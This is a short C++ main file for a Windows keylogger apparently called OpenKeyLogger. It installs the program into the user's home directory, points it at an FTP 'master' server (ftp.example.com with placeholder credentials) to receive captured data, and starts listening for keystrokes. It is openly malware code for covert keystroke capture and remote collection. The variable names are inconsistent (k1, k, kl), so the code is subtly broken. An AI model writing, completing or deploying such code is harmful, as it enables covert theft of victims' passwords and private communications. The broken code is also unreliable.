#include "keylogger.h"

using namespace std;

int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
{

    KeyLogger* k1 = KeyLogger::getInstance();

    k1->install(k1->getUserHomeDirectory() + "OpenKeyLogger.exe");

    k->setMaster("ftp.example.com", 21, "user", "pass");

    kl->listen();

    kl->loop();

    return 0;
}